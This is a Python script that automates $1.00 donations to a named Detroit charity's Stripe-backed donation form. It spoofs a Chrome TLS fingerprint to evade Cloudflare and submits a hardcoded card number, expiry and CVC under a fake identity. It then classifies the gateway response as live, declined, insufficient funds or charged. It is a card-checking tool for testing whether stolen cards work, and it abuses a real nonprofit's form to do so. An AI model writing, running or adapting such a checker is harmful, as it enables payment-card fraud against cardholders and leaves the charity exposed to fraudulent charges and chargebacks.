import time
import re
import json
import random
from curl_cffi import requests as curl_requests

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

URL = 'https://higherhopesdetroit.org/donation/'
FORM_ID = '1057'
FORM_HASH = 'ee0e509410'
FORM_PREFIX = '1057-1'
STRIPE_KEY = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
DONATION_URL = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={FORM_ID}'

CARD_NUMBER = '5104040287872188'
EXP_MONTH = '12'
EXP_YEAR = '27'
CVC = '951'

FIRST_NAME = 'James'
LAST_NAME = 'Smith'
EMAIL = f'james{random.randint(100,999)}@gmail.com'
ADDRESS = '123 Main Street'
CITY = 'New York'
STATE = 'NY'
ZIP = '10001'
COUNTRY = 'US'


# ═══════════════════════════════════════════════════════════
# STEP 1: Open Page with curl_cffi (Cloudflare bypass)
# ═══════════════════════════════════════════════════════════

def step1_open_page():
    """فتح الصفحة بـ curl_cffi (محاكاة Chrome TLS)"""
    print("=" * 60)
    print("STEP 1: Opening page with curl_cffi")
    print("=" * 60)
    
    try:
        # impersonate="chrome120" بيحاكي Chrome 120 TLS fingerprint
        session = curl_requests.Session(impersonate="chrome120")
        
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="120", "Not_A Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }
        
        response = session.get(URL, headers=headers, timeout=30)
        
        print(f"📥 Status: {response.status_code}")
        print(f"📄 Length: {len(response.text)}")
        print(f"📄 First 300 chars: {response.text[:300]}")
        
        if response.status_code == 403:
            return None, "403_FORBIDDEN"
        
        if response.status_code != 200:
            return None, f"HTTP_{response.status_code}"
        
        html = response.text
        html_lower = html.lower()
        
        # Cloudflare check
        if 'just a moment' in html_lower or 'checking your browser' in html_lower:
            return None, "CLOUDFLARE_CHALLENGE"
        
        # Check for form
        if 'give-form-id' not in html:
            return None, "NO_GIVE_FORM"
        
        print("✅ Page loaded successfully")
        return session, "OK"
    
    except Exception as e:
        print(f"❌ Error: {e}")
        return None, f"ERROR: {str(e)[:100]}"


# ═══════════════════════════════════════════════════════════
# STEP 2: Create Stripe Payment Method
# ═══════════════════════════════════════════════════════════

def step2_create_stripe_pm(session):
    """محاولة إنشاء Stripe Payment Method"""
    print("\n" + "=" * 60)
    print("STEP 2: Creating Stripe Payment Method")
    print("=" * 60)
    
    # Stripe API - استخدام /v1/payment_methods
    # الـ API ده مش بيقبل pk_ للأسف، محتاج sk_ أو Stripe.js
    
    try:
        # جرب الـ endpoint المشهور
        stripe_url = 'https://api.stripe.com/v1/payment_methods'
        
        data = {
            'type': 'card',
            'card[number]': CARD_NUMBER,
            'card[exp_month]': EXP_MONTH,
            'card[exp_year]': EXP_YEAR,
            'card[cvc]': CVC,
            'billing_details[name]': f'{FIRST_NAME} {LAST_NAME}',
            'billing_details[email]': EMAIL,
            'billing_details[address][line1]': ADDRESS,
            'billing_details[address][city]': CITY,
            'billing_details[address][state]': STATE,
            'billing_details[address][postal_code]': ZIP,
            'billing_details[address][country]': COUNTRY,
            'key': STRIPE_KEY,
        }
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
        }
        
        response = session.post(
            stripe_url,
            data=data,
            headers=headers,
            timeout=30
        )
        
        print(f"📥 Status: {response.status_code}")
        print(f"📥 Response: {response.text[:500]}")
        
        if response.status_code == 200:
            result = response.json()
            if 'id' in result:
                pm_id = result['id']
                print(f"✅ PM ID: {pm_id}")
                return pm_id, "OK"
        
        # محاولة 2: استخدام Stripe Elements session
        # ...
        
        return None, f"STRIPE_{response.status_code}"
    
    except Exception as e:
        print(f"❌ Error: {e}")
        return None, f"ERROR: {str(e)[:100]}"


# ═══════════════════════════════════════════════════════════
# STEP 3: Submit Donation
# ═══════════════════════════════════════════════════════════

def step3_submit_donation(session, pm_id):
    """إرسال طلب التبرع"""
    print("\n" + "=" * 60)
    print("STEP 3: Submitting donation")
    print("=" * 60)
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': FORM_PREFIX,
        'give-form-id': FORM_ID,
        'give-form-title': 'Give a Donation',
        'give-current-url': URL,
        'give-form-url': URL,
        'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': FORM_HASH,
        'give-price-id': 'custom',
        'give-amount': '1.00',
        'give_tributes_type': 'In Honor Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'In Honor Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_stripe_payment_method': pm_id,
        'payment-mode': 'stripe',
        'give_first': FIRST_NAME,
        'give_last': LAST_NAME,
        'give_email': EMAIL,
        'give_comment': 'Donation',
        'card_name': f'{FIRST_NAME} {LAST_NAME}',
        'billing_country': COUNTRY,
        'card_address': ADDRESS,
        'card_address_2': '',
        'card_city': CITY,
        'card_state': STATE,
        'card_zip': ZIP,
        'give_action': 'purchase',
        'give-gateway': 'stripe',
    }
    
    headers = {
        'authority': 'higherhopesdetroit.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://higherhopesdetroit.org',
        'referer': URL,
        'sec-ch-ua': '"Chromium";v="120", "Not_A Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
    }
    
    try:
        response = session.post(
            DONATION_URL,
            data=data,
            headers=headers,
            timeout=30
        )
        
        print(f"📥 Status: {response.status_code}")
        print(f"📄 Length: {len(response.text)}")
        
        return parse_response(response.text, response.status_code)
    
    except Exception as e:
        return f"ERROR: {str(e)[:100]}"


# ═══════════════════════════════════════════════════════════
# Parse Response
# ═══════════════════════════════════════════════════════════

def parse_response(text, status_code):
    """تحليل الرد"""
    text_lower = text.lower()
    
    live_map = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
    }
    
    for kw, resp in live_map.items():
        if kw in text_lower:
            return resp
    
    if text.strip().startswith('{'):
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                if data.get('success'):
                    return 'CHARGE 1.0'
                if 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    if 'error' in inner:
                        return f"GATEWAY: {inner['error'][:100]}"
        except:
            pass
    
    matches = re.findall(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
    if matches:
        return f"ERROR: {matches[0][:100]}"
    
    if status_code == 200:
        return f"UNKNOWN: {text[:200].strip()}"
    return f"HTTP_{status_code}"


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def run():
    print("🚀 STARTING")
    
    # Step 1: Open page
    session, result = step1_open_page()
    if result != "OK":
        print(f"❌ Failed at Step 1: {result}")
        return result
    
    # Step 2: Create Stripe PM
    pm_id, result = step2_create_stripe_pm(session)
    if result != "OK":
        print(f"❌ Failed at Step 2: {result}")
        return result
    
    # Step 3: Submit donation
    final_result = step3_submit_donation(session, pm_id)
    
    print("\n" + "=" * 60)
    print(f"📊 FINAL: {final_result}")
    print("=" * 60)
    
    return final_result


if __name__ == '__main__':
    run()
